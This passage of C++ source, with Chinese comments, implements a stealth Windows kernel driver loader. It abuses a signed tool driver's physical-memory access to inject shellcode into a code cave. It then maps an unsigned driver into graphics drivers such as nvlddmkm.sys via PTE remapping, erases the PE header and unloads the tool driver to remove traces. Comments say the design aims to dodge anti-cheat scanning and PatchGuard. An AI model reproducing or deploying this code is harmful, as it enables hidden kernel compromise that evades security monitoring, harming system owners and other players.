        bool isDiscardable  = (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0;
        uint64_t dummyPA    = 0;
        bool firstPageOk    = VirtToPhys(hDev, cr3, hostDrvBase + secRVA, &dummyPA);

        LOG_INFO("  [%02d] %-8s RVA=0x%08X vSize=0x%08X Discard=%d Present=%d",
                 i, secName, secRVA, vSize, isDiscardable ? 1 : 0, firstPageOk ? 1 : 0);
    }

    // 提示：严禁将活跃节区（如 .text / .data / PAGE）的起始段作为 Cave，
    // 那些区域承载着系统驱动的正在运行的代码和数据，覆写会导致 0x1E / 0x3B 蓝屏。
    // 大容量载荷统一走方案 A（PTE Remap 挂接引擎）。

    // 提示：大容量载荷（>= 4KB）统一走方案 A（PTE Remap 挂接引擎），严禁原位覆写宿主原生常驻物理页以防践踏宿主内部线程数据结构。

    // --- 策略 2：节区末尾页间隙（VirtualSize 到 AlignedVirtualSize 之间，物理页存在）---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        uint32_t alignedVSz = (vSize + PAGE - 1) & ~(PAGE - 1);
        uint32_t gap        = (alignedVSz > vSize) ? (alignedVSz - vSize) : 0;

        if (gap >= neededBytes && secRVA + vSize + neededBytes <= hostOrigSize) {
            uint32_t caveRVA = secRVA + vSize;
            if (ArePagesPresent(hDev, cr3, hostDrvBase + caveRVA, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: page-gap in '%s' RVA=0x%X gap=0x%X (pages verified)",
                       hostDrvNameA, secName, caveRVA, gap);
                return caveRVA;
            }
        }
    }

    // --- 策略 3：相邻节区之间的裂缝（已映射物理页）---
    for (WORD i = 0; i + 1 < nSec; i++) {
        uint32_t thisEnd = sec[i].VirtualAddress +
                           ((sec[i].Misc.VirtualSize + PAGE - 1) & ~(PAGE - 1));
        uint32_t nextStart = sec[i + 1].VirtualAddress;
        if (nextStart > thisEnd && nextStart - thisEnd >= neededBytes &&
            thisEnd + neededBytes <= hostOrigSize)
        {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + thisEnd, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: inter-section gap RVA=0x%X size=0x%X (pages verified)",
                       hostDrvNameA, thisEnd, nextStart - thisEnd);
                return thisEnd;
            }
        }
    }

    // --- 策略 4：尾部对齐填充（最后一个节到 SizeOfImage 之间，已映射物理页）---
    if (nSec > 0) {
        uint32_t lastRVA   = sec[nSec - 1].VirtualAddress;
        uint32_t lastVSz   = sec[nSec - 1].Misc.VirtualSize ? sec[nSec - 1].Misc.VirtualSize
                                                              : sec[nSec - 1].SizeOfRawData;
        uint32_t afterLast = (lastRVA + lastVSz + PAGE - 1) & ~(PAGE - 1);
        if (afterLast + neededBytes <= hostOrigSize) {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + afterLast, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: tail padding RVA=0x%X avail=0x%X (pages verified)",
                       hostDrvNameA, afterLast, hostOrigSize - afterLast);
                return afterLast;
            }
        }
    }

    LOG_WARN("FindHostInternalCave[%s]: no resident cave >= 0x%X bytes with valid physical pages found inside SizeOfImage=0x%X",
             hostDrvNameA, neededBytes, hostOrigSize);
    return 0;
}

// ================================================================
// AllocKernelMdlViaWhql
//
// 纯游离物理页分配原语 (Headless Physical Allocation)：
// 触发微型探针调用 MmAllocatePagesForMdl(0, 0xFFFFFFFFFF, 0, neededBytes)
// 申请脱离系统虚拟地址池（NonPagedPool）的纯净物理内存页，
// 彻底杜绝在系统大池表 (PoolBigPageTable) 中留下记录，消除源虚拟地址解绑痕迹！
// ================================================================
// 分支 2B 说明：
// 旧方案中在用户态通过频繁调用 WhqlWritePhys 改写 PTE 与写入镜像的
// AllocKernelMdlViaWhql 与 PteRemapHostDriverHeadless 已全量废除。
// 分支 2B 全程在内核态由 scBranch2B 闭环完成物理页申请、PTE 映射修改与 rep movsb 直拷，
// 用户态物理写入次数严格为 0，彻底杜绝宿主驱动调用 ZwMapViewOfSection 触发反作弊特征！
// ================================================================
// ================================================================
// InjectPayloadIntoHost (分支 2B: 宿主驱动原位 PTE 缝合与直接搬移准备)
//
// 彻底废除任何用户态物理写（WhqlWritePhys）与 ZwMapViewOfSection:
// 1. 纯只读解析宿主 PE 节表，选取 Discardable / INIT 或 .reloc 节区
// 2. 纯只读遍历页表获取目标节区首个 PTE 物理地址 (firstPtePA)
// 3. 在用户态对 payload 完成重定位 (ApplyRelocation)
// 4. 将物理页分配、PTE 缝合、TLB 刷新与镜像直接灌入全部交由内核态 Shellcode 闭环执行！
// ================================================================
static bool InjectPayloadIntoHost(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    uint64_t       hostLdrEntryVA,
    const wchar_t* hostDrvName,
    MappedImage&   payloadImg,          // 非 const：写入后更新 KernelBase
    uint64_t&      outPayloadKernVA,    // [out] payload 落点内核 VA
    uint64_t&      outFirstPtePA,       // [out] 分支 2B: 宿主目标节区起始 PTE 物理地址
    uint64_t       ntoskrnlBase = 0,
    uint64_t       triggerDrvBase = 0,
    uint32_t       triggerDrvSize = 0,
    const WhqlPatchSite* pSite = nullptr,
    uint64_t       caveVA = 0,
    uint64_t       pfnDataBase = 0)
{
    (void)hostLdrEntryVA;
    (void)ntoskrnlBase;
    (void)triggerDrvBase;
    (void)triggerDrvSize;
    (void)pSite;
    (void)caveVA;
    (void)pfnDataBase;
    outPayloadKernVA = 0;
    outFirstPtePA    = 0;

    char hostNameA[256] = {};
    WideCharToMultiByte(CP_ACP, 0, hostDrvName, -1, hostNameA, sizeof(hostNameA) - 1, nullptr, nullptr);

    LOG_INFO("InjectPayloadIntoHost (Branch 2B): host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X",
             hostDrvName, hostDrvBase, hostOrigSize, payloadImg.SizeOfImage);

    // --- 0. 读取宿主内存 PE 头（前 0x1000 字节，仅用于只读解析节表） ---
    uint8_t hdrBuf[0x1000] = {};
    if (!ReadKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf))) {
        LOG_ERR("InjectPayloadIntoHost: cannot read host PE header");
        return false;
    }

    auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew >= (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64))) {
        LOG_ERR("InjectPayloadIntoHost: bad host DOS header");
        return false;
    }
    auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERR("InjectPayloadIntoHost: bad host NT signature");
        return false;
    }

    // --- 1. 寻找宿主驱动可挂接的节区 (优先 INIT / Discardable 节，次选 .reloc) ---
    uint32_t candidateTargetRVA = 0;
    uint32_t totalNeededBytes = payloadImg.SizeOfImage + 0x1000;
    uint32_t needRemapBytes = (totalNeededBytes + 0xFFF) & ~0xFFF;

    // Pass 1: 优先寻找 INIT 节或带有 IMAGE_SCN_MEM_DISCARDABLE (0x02000000) 属性的节区
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        auto* s = &IMAGE_FIRST_SECTION(nt)[i];
        char sName[9] = {};
        memcpy(sName, s->Name, 8);
        uint32_t rva = s->VirtualAddress;
        uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

        bool isDiscardable = ((s->Characteristics & 0x02000000) != 0) || (_strnicmp(sName, "INIT", 4) == 0);

        if (isDiscardable && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
            candidateTargetRVA = rva;
            LOG_OK("InjectPayloadIntoHost (Branch 2B): [Pass 1] selected Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
                   sName, rva, vSz, needRemapBytes);
            break;
        }
    }

    // Pass 2: 若未找到足够大的 INIT 节，次选 .reloc
    if (candidateTargetRVA == 0) {
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
            char sName[9] = {};
            memcpy(sName, s->Name, 8);
            uint32_t rva = s->VirtualAddress;
            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

            if (_strnicmp(sName, ".reloc", 6) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                candidateTargetRVA = rva;
                LOG_OK("InjectPayloadIntoHost (Branch 2B): [Pass 2] selected .reloc section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
                       sName, rva, vSz, needRemapBytes);
                break;
            }
        }
    }

    if (candidateTargetRVA == 0) {
        LOG_ERR("InjectPayloadIntoHost: no suitable INIT or .reloc section >= 0x%X bytes found in host", needRemapBytes);
        return false;
    }

    uint64_t payloadTargetVA = hostDrvBase + candidateTargetRVA;

    // --- 2. 获取目标节区首个 PTE 物理地址 (只读遍历 CR3，0 次物理写，0 次 ZwMapViewOfSection!) ---
    uint64_t firstPtePA = 0, oldPte = 0;
    if (!GetPtePhysAddr(hDev, cr3, payloadTargetVA, &firstPtePA, &oldPte)) {
        LOG_ERR("InjectPayloadIntoHost: cannot locate PTE PA for target VA=0x%016llX", payloadTargetVA);
        return false;
    }

    // --- 3. 对 payload 镜像应用重定位 (目标基址 = payloadTargetVA) ---
    if (!ApplyRelocation(payloadImg, payloadTargetVA)) {
        LOG_WARN("InjectPayloadIntoHost: ApplyRelocation failed (non-fatal if no delta)");
    }
    payloadImg.KernelBase = payloadTargetVA;

    outPayloadKernVA = payloadTargetVA;
    outFirstPtePA    = firstPtePA;

    LOG_OK("InjectPayloadIntoHost (Branch 2B): Target VA=0x%016llX (FirstPtePA=0x%016llX). 100%% Zero user-mode physical writes, PTE remap & direct movsb deferred to kernel Shellcode!",
           payloadTargetVA, firstPtePA);
    return true;
}

static bool LoadDrvWsk(const wchar_t* drvWskPath,
                       const wchar_t* triggerDrvName = L"Machenike.sys",
                       const wchar_t* preferredHostDrvName = L"nvlddmkm.sys",
                       bool forceReload = false,
                       const DRV_BOOT_CONFIG* pBootConfig = nullptr)
{
    // 防御性过滤：严禁将系统网络核心驱动 tcpip.sys 作为宿主（高危审计与 PatchGuard 风险）
    if (preferredHostDrvName && _wcsicmp(preferredHostDrvName, L"tcpip.sys") == 0) {
        LOG_WARN("LoadDrvWsk: tcpip.sys is strictly forbidden as host driver (PatchGuard & AC audit high-risk). Fallback to auto-detect.");
        preferredHostDrvName = nullptr;
    }

    // ---- 1. 打开设备 ----
    HANDLE hDev = WhqlOpen();
    if (hDev == INVALID_HANDLE_VALUE) {
        LOG_ERR("LoadDrvWsk: Unable to open WHQL device");
        return false;
    }

    // ---- 2. 获取系统信息 ----
    WINPMEM_MEMORY_INFO info = {};
    if (!WhqlGetInfo(hDev, &info)) {
        LOG_ERR("LoadDrvWsk: WhqlGetInfo failed");
        CloseHandle(hDev);
        return false;
    }
    uint64_t cr3               = (uint64_t)info.CR3.QuadPart;
    uint64_t ntoskrnlBase      = (uint64_t)info.KernBase.QuadPart;
    uint64_t psLoadedModList   = (uint64_t)info.PsLoadedModuleList.QuadPart;
    uint64_t pfnDataBase       = (uint64_t)info.PfnDataBase.QuadPart;
    if (psLoadedModList == 0) {
        psLoadedModList = ResolvePsLoadedModuleList(ntoskrnlBase);
    }

    LOG_INFO("LoadDrvWsk: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX PfnDb=0x%016llX",
             cr3, ntoskrnlBase, psLoadedModList, pfnDataBase);

    // ---- 3. 找触发驱动在 PsLoadedModuleList 中的条目 ----
    uint64_t triggerDrvBase     = 0;
    uint32_t triggerDrvSize     = 0;
    uint64_t triggerLdrEntryVA  = 0;
    bool foundMod = false;
    if (psLoadedModList != 0) {
        foundMod = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                      triggerDrvName, triggerDrvBase, triggerDrvSize, triggerLdrEntryVA);
    }
    if (!foundMod) {
        LOG_WARN("LoadDrvWsk: %ls not found via PsLoadedModuleList, falling back to Psapi...", triggerDrvName);
        foundMod = FindWhqlModuleViaPsapi(triggerDrvName, triggerDrvBase, triggerDrvSize);
    }
    if (!foundMod) {
        LOG_ERR("LoadDrvWsk: Trigger driver %ls not found in system driver list", triggerDrvName);
        CloseHandle(hDev);
        return false;
    }

    // ---- 3.1 方案 1：检测内核物理暗桩，防止重复加载 ----
    if (!forceReload) {
        // 先检查指定的宿主驱动暗桩 (若配置)
        if (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) {
            uint64_t prefBase = 0;
            uint32_t prefSize = 0;
            uint64_t prefLdrVA = 0;
            bool foundPref = false;
            if (psLoadedModList != 0) {
                foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                                preferredHostDrvName, prefBase, prefSize, prefLdrVA);
            }
            if (!foundPref) {
                foundPref = FindWhqlModuleViaPsapi(preferredHostDrvName, prefBase, prefSize);
            }
            if (foundPref && CheckDriverCanary(hDev, cr3, prefBase, prefSize, preferredHostDrvName)) {
                CloseHandle(hDev);
                hDev = INVALID_HANDLE_VALUE;
                LOG_INFO("LoadDrvWsk: Core driver already active, unloading '%ls' tool driver...", triggerDrvName);
                UnloadWhqlDriver(triggerDrvName);
                return true;
            }
        }
        // 再检查触发驱动 (Machenike.sys)
        if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
            CloseHandle(hDev);
            hDev = INVALID_HANDLE_VALUE;
            LOG_INFO("LoadDrvWsk: Core driver already active, unloading '%ls' tool driver...", triggerDrvName);
            UnloadWhqlDriver(triggerDrvName);
            return true;
        }
    } else {
        LOG_WARN("LoadDrvWsk: Force reload flag enabled, clearing existing kernel canary.");
        ClearDriverCanary(hDev, cr3, triggerDrvBase);
    }

    // ---- 4. 扫描 default 分支特征码 ----
    WhqlPatchSite site = {};
    if (!FindWhqlDefaultBranch(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
        LOG_ERR("LoadDrvWsk: WHQL default branch signature not found");
        CloseHandle(hDev);
        return false;
    }

    // ---- 5. 读取并展开 mswsk.sys ----
    auto rawBuf = ReadFile(drvWskPath);
    if (rawBuf.empty()) {
        LOG_ERR("LoadDrvWsk: Failed to read %ls", drvWskPath);
        CloseHandle(hDev);
        return false;
    }

    MappedImage img = {};
    if (!SectionMap(rawBuf, img)) {
        LOG_ERR("LoadDrvWsk: SectionMap failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 6. 修复重定位与 IAT ----
    if (!FixIAT(hDev, cr3, ntoskrnlBase, img)) {
        LOG_ERR("LoadDrvWsk: FixIAT failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 7. 抹除 PE 头 ----
    ErasePEHeader(img);

    // ---- 8. 锁定用户态展开镜像内存页 ----
    if (!VirtualLock(img.Image.data(), img.Image.size())) {
        LOG_WARN("LoadDrvWsk: VirtualLock warning GLE=%lu (non-fatal, continuing)", GetLastError());
    }

    uint64_t userImageVA = (uint64_t)img.Image.data();
    LOG_INFO("LoadDrvWsk: [Plan C] User-mode mapped image ready VA=0x%016llX size=%zu",
             userImageVA, img.Image.size());

    // ---- 9. 定位触发驱动中的安全代码空洞 (Code Cave) ----
    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scBranch2B_size;
    uint64_t caveVA = FindWhqlCodeCaveVA(hDev, cr3, triggerDrvBase, totalPayloadSize);
    if (!caveVA) {
        LOG_ERR("LoadDrvWsk: Failed to locate available Code Cave");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 9.1 定位宿主驱动（优选显卡驱动宿主）----
    uint64_t hostDrvBase = triggerDrvBase;
    uint32_t hostDrvSize = triggerDrvSize;
    uint64_t hostLdrEntryVA = triggerLdrEntryVA;
    const wchar_t* actualHostName = triggerDrvName;

    // 优选显卡驱动宿主探测序列：
    // 首选独立显卡驱动(NVIDIA 50~110MB / AMD 30~80MB) -> 核显(Intel 20~40MB) -> DirectX图形核心(dxgkrnl 10~20MB)
    // 彻底剔除高危、被重点监控的系统网络核心驱动 tcpip.sys
    const wchar_t* candidateHosts[] = {
        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : nullptr,
        L"nvlddmkm.sys", // NVIDIA 独立显卡内核驱动（体积极大，Discardable节充裕，ACE不敢深扫）
        L"amdkmdag.sys", // AMD 显卡内核驱动
        L"igdkmd64.sys", // Intel 核心显卡驱动
        L"dxgkrnl.sys"   // Windows DirectX 内核图形引擎驱动（全系统常驻）
    };

    const wchar_t* chosenHostName = nullptr;
    uint64_t prefBase = 0;
    uint32_t prefSize = 0;
    uint64_t prefLdrVA = 0;
    bool foundPref = false;

    for (const wchar_t* cand : candidateHosts) {
        if (!cand || wcslen(cand) == 0 || _wcsicmp(cand, triggerDrvName) == 0) continue;
        if (psLoadedModList != 0) {
            foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList, cand, prefBase, prefSize, prefLdrVA);
        }
        if (!foundPref) {
            foundPref = FindWhqlModuleViaPsapi(cand, prefBase, prefSize);
        }
        if (foundPref) {
            chosenHostName = cand;
            LOG_OK("LoadDrvWsk: Selected optimal host driver '%ls' (Base=0x%016llX, OrigSize=0x%X)",
                   chosenHostName, prefBase, prefSize);
            break;
        }
    }

    // ---- 9.2 分支 2B：宿主目标节区预备（零修改 PE 头，用户态 0 次物理写入）----
    uint64_t payloadKernVA = 0; // mswsk 在宿主内部的目标内核 VA
    uint64_t firstPtePA    = 0; // 目标节区首个 PTE 物理地址

    if (foundPref && chosenHostName) {
        if (InjectPayloadIntoHost(
                hDev, cr3, prefBase, prefSize, prefLdrVA,
                chosenHostName, img, payloadKernVA, firstPtePA,
                ntoskrnlBase, triggerDrvBase, triggerDrvSize,
                &site, caveVA, pfnDataBase))
        {
            hostDrvBase    = prefBase;
            hostDrvSize    = prefSize;   // SizeOfImage 保持原生宿主大小不变
            hostLdrEntryVA = prefLdrVA;
            actualHostName = chosenHostName;
            LOG_OK("LoadDrvWsk: [Branch 2B] payload target prepared inside '%ls' at KernVA=0x%016llX (FirstPtePA=0x%016llX)",
                   actualHostName, payloadKernVA, firstPtePA);
        } else {
            LOG_ERR("LoadDrvWsk: InjectPayloadIntoHost failed to embed payload into '%ls'", chosenHostName);
            VirtualUnlock(img.Image.data(), img.Image.size());
            CloseHandle(hDev);
            return false;
        }
    } else {
        LOG_ERR("LoadDrvWsk: No optimal host driver found, aborting (old ExAllocatePool fallback removed)");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 10. 构建 ShellcodeParams (分支 2B 契约) ----
    InjectContext ctx = {};
    ctx.hDev               = hDev;
    ctx.cr3                = cr3;
    ctx.ntoskrnlBase       = ntoskrnlBase;
    ctx.psLoadedModuleList = psLoadedModList;
    ctx.whqlDrvBase        = hostDrvBase;
    ctx.whqlDrvSize        = hostDrvSize;
    ctx.whqlLdrEntryVA     = hostLdrEntryVA;                     // fakeDriverObj.DriverSection
    ctx.pImg               = &img;
    ctx.userImageVA        = (uint64_t)img.Image.data();         // 核心突破：用户态锁定缓冲区（当前进程 CR3 下原生可读）
    ctx.payloadTargetVA    = payloadKernVA;                      // 宿主驱动目标内核 VA
    ctx.firstPtePA         = firstPtePA;                         // 宿主目标 PTE 物理起始地址
    ctx.pageCount          = (img.SizeOfImage + 0xFFF) / 0x1000; // 映射物理页数
    ctx.hookReturnVA       = site.kernVA + 5;
    if (pBootConfig) {
        ctx.bootConfig = *pBootConfig;
    } else {
        ctx.bootConfig.Magic         = DRV_BOOT_MAGIC;
        ctx.bootConfig.TransportMode = DRV_TRANSPORT_TCP;
        ctx.bootConfig.Port          = 10001;
        ctx.bootConfig.AuthToken     = 0;
        ctx.bootConfig.Flags         = 0;
    }

    ShellcodeParams params = {};
    if (!BuildShellcodeParams(ctx, params)) {
        LOG_ERR("LoadDrvWsk: BuildShellcodeParams failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 11. 注入 Branch 2B Shellcode (内核态分配+PTE映射+rep movsb直拷+执行) ----
    LOG_INFO("LoadDrvWsk: Using Branch 2B execution shellcode (Kernel PTE Remap + Direct movsb Copy)");
    // 防御加固：加装 ScopedThreadAffinity 强行绑定当前线程至单一核心，确保从 PTE 修改、执行到清理全程不发生核间迁移
    ScopedThreadAffinity threadAffinity;
    if (!InjectShellcodeFull(hDev, cr3, site, caveVA, params, scBranch2B, scBranch2B_size)) {
        LOG_ERR("LoadDrvWsk: InjectShellcodeFull failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 12. 触发 default 分支执行 Shellcode（内核线程内同步执行）----
    LOG_INFO("LoadDrvWsk: Triggering WHQL default branch via %ls...", triggerDrvName);
    uint32_t gle = 0;
    bool ioOk = WhqlTrigger(hDev, &gle);

    // ---- 13. 恢复 WHQL default 分支原始指令并清理 Code Cave ----
    RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, totalPayloadSize);

    // 解锁用户态内存
    VirtualUnlock(img.Image.data(), img.Image.size());

    if (!ioOk) {
        if (gle == ERROR_SHARING_VIOLATION || gle == 32) {
            LOG_OK("================================================================");
            LOG_OK("[+] Core driver (mswsk) is ALREADY ACTIVE (Transport port conflict GLE=32)!");
            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
            LOG_OK("================================================================");
            CloseHandle(hDev);
            hDev = INVALID_HANDLE_VALUE;
            LOG_INFO("LoadDrvWsk: Unloading '%ls' tool driver...", triggerDrvName);
            UnloadWhqlDriver(triggerDrvName);
            return true;
        }
        LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
        CloseHandle(hDev);
        hDev = INVALID_HANDLE_VALUE;
        UnloadWhqlDriver(triggerDrvName);
        return false;
    }

    CloseHandle(hDev);
    hDev = INVALID_HANDLE_VALUE;

    // ---- 14. 核心驱动启动成功，立即卸载 Machenike.sys 工具驱动抹除内核痕迹 ----
    LOG_INFO("LoadDrvWsk: Core driver running successfully, unloading '%ls' tool driver...", triggerDrvName);
    UnloadWhqlDriver(triggerDrvName);

    LOG_OK("LoadDrvWsk: mswsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
           actualHostName, hostDrvSize);
    return true;
}

// 别名包装，明确 ManualMapCave 模式语义
static inline bool LoadDrvWskViaCave(
    const wchar_t*        drvWskPath,
    const wchar_t*        triggerDrvName       = L"Machenike.sys",
    const wchar_t*        preferredHostDrvName = L"nvlddmkm.sys",
    bool                  forceReload          = false,
    const DRV_BOOT_CONFIG* pBootConfig         = nullptr)
{
    return LoadDrvWsk(drvWskPath, triggerDrvName, preferredHostDrvName, forceReload, pBootConfig);
}
